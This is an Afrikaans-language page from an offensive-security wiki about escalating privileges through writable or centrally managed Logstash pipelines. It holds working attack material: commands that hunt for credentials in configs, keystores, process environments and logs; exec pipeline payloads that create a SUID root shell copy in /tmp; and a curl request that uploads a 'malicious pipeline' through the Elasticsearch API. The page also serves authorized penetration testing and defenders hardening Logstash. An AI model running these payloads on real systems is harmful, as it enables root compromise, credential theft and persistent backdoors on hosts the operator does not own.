# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash word gebruik om **logs in te samel, te transformeer en deur te stuur** deur ’n stelsel wat as **pipelines** bekend staan. Hierdie pipelines bestaan uit **input**-, **filter**- en **output**-stadiums. ’n Interessante aspek ontstaan wanneer Logstash op ’n gekompromitteerde masjien werk.

### Pipeline-konfigurasie

Pipelines word in die lêer **/etc/logstash/pipelines.yml** gekonfigureer, wat die liggings van die pipeline-konfigurasies lys:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Hierdie lêer wys waar die **.conf**-lêers, wat pipeline-konfigurasies bevat, geleë is. Wanneer ’n **Elasticsearch output module** gebruik word, is dit algemeen dat **pipelines** **Elasticsearch credentials** bevat, wat dikwels uitgebreide privileges het omdat Logstash data na Elasticsearch moet skryf. Wildcards in konfigurasiepaaie laat Logstash toe om alle ooreenstemmende pipelines in die aangewese gids uit te voer.

As Logstash met `-f <directory>` eerder as `pipelines.yml` begin word, word **alle lêers binne daardie gids in leksikografiese volgorde saamgevoeg en as ’n enkele config ontleed**. Dit skep 2 offensiewe implikasies:

- ’n Geplaasde lêer soos `000-input.conf` of `zzz-output.conf` kan verander hoe die finale pipeline saamgestel word
- ’n Foutiewe lêer kan verhoed dat die hele pipeline laai, dus valideer payloads noukeurig voordat jy op auto-reload staatmaak

### Vinnige Enumeration op ’n Gekompromitteerde Host

Op ’n box waar Logstash geïnstalleer is, inspekteer vinnig:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Kontroleer ook of die plaaslike monitoring API bereikbaar is. By verstek luister dit op **127.0.0.1:9600**, wat gewoonlik voldoende is nadat jy op die host geland het:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
This gee jou gewoonlik pipeline IDs, runtime-besonderhede en bevestiging dat jou gewysigde pipeline gelaai is.

Credentials wat van Logstash herwin is, ontsluit dikwels **Elasticsearch**, so kyk na [hierdie ander bladsy oor Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Skryfbare Pipelines

Om Privilege Escalation te probeer, identifiseer eers die gebruiker onder wie die Logstash-diens loop, gewoonlik die **logstash**-gebruiker. Maak seker dat jy aan **een** van hierdie kriteria voldoen:

- Beskik oor **skryftoegang** tot ’n pipeline-**.conf**-lêer **of**
- Die **/etc/logstash/pipelines.yml**-lêer gebruik ’n wildcard, en jy kan na die teikenvouer skryf

Daarbenewens moet **een** van hierdie voorwaardes vervul word:

- Vermoë om die Logstash-diens te herbegin **of**
- Die **/etc/logstash/logstash.yml**-lêer het `config.reload.automatic: true` gestel

Gegewe ’n wildcard in die konfigurasie, laat die skep van ’n lêer wat met hierdie wildcard ooreenstem command execution toe. Byvoorbeeld:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Hier bepaal **interval** die uitvoeringsfrekwensie in sekondes. In die gegewe voorbeeld loop die **whoami**-command elke 120 sekondes, met die uitvoer wat na **/tmp/output.log** gerig word.

Met **config.reload.automatic: true** in **/etc/logstash/logstash.yml** sal Logstash outomaties nuwe of gewysigde pipeline-konfigurasies bespeur en toepas sonder dat dit herbegin hoef te word.<sup>[[1]](#references)</sup> Indien daar geen wildcard is nie, kan bestaande konfigurasies steeds gewysig word, maar versigtigheid word aanbeveel om ontwrigtings te voorkom.

### Meer Betroubare Pipeline Payloads

Die `exec` input plugin werk steeds in huidige releases en vereis óf ’n `interval` óf ’n `schedule`. Dit voer uit deur die Logstash JVM te **fork**, dus kan jou payload met `ENOMEM` misluk as geheue beperk is, eerder as om stilweg te loop.

’n Meer praktiese privilege-escalation payload is gewoonlik een wat ’n duursame artifact agterlaat:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
As jy nie herbeginregte het nie, maar die proses kan signaliseer, ondersteun Logstash ook ’n **SIGHUP**-geaktiveerde herlaai op Unix-agtige stelsels:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Wees bewus daarvan dat nie elke plugin herlaai-vriendelik is nie. Die **stdin**-input verhoed byvoorbeeld outomatiese herlaai, moenie dus aanneem dat `config.reload.automatic` altyd jou veranderinge sal optel nie.<sup>[[1]](#references)</sup>

### Steel van Secrets uit Logstash

Voordat jy net op code execution fokus, versamel die data waartoe Logstash reeds toegang het:

- Plaintext credentials word dikwels binne `elasticsearch {}`-outputs, `http_poller`-, JDBC-inputs of cloud-verwante instellings hardcoded
- Secure settings kan in **`/etc/logstash/logstash.keystore`** of ’n ander `path.settings`-gids wees
- Die keystore-wagwoord word dikwels deur **`LOGSTASH_KEYSTORE_PASS`** verskaf, en package-gebaseerde installasies verkry dit gewoonlik vanaf **`/etc/sysconfig/logstash`**
- Environment-variable expansion met `${VAR}` word tydens Logstash se opstart opgelos, dus is dit die moeite werd om die service se environment te inspekteer

Nuttige kontroles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Dit is ook die moeite werd om na te gaan omdat **CVE-2023-46672** getoon het dat Logstash onder spesifieke omstandighede sensitiewe inligting in logs kon opteken. Op ’n post-exploitation host kan ou Logstash-logs en `journald`-inskrywings dus credentials blootlê, selfs al verwys die huidige config na die keystore eerder as om secrets inline te stoor.<sup>[[3]](#references)</sup>

### Misbruik van gesentraliseerde Pipeline Management

In sommige omgewings maak die host glad nie op plaaslike `.conf`-lêers staat nie. As **`xpack.management.enabled: true`** gekonfigureer is, kan Logstash sentraal bestuurde pipelines vanaf Elasticsearch/Kibana aflaai, en nadat hierdie modus geaktiveer is, is plaaslike pipeline-configs nie meer die source of truth nie.<sup>[[2]](#references)</sup>

Dit beteken ’n ander aanvalspad:

1. Herwin Elastic credentials vanaf plaaslike Logstash-settings, die keystore of logs
2. Verifieer of die account die **`manage_logstash_pipelines`**-cluster privilege het
3. Skep of vervang ’n sentraal bestuurde pipeline sodat die Logstash-host jou payload tydens sy volgende poll interval uitvoer

Die Elasticsearch API wat vir hierdie feature gebruik word, is:<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Dit is veral nuttig wanneer plaaslike lêers slegs-leesbaar is, maar Logstash reeds geregistreer is om pipelines op afstand te gaan haal.

## Verwysings

- [1] [Elastic Docs: Herlaai die konfigurasielêer](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Stel gesentraliseerde pipelinebestuur op](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1-sekuriteitsopdatering (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
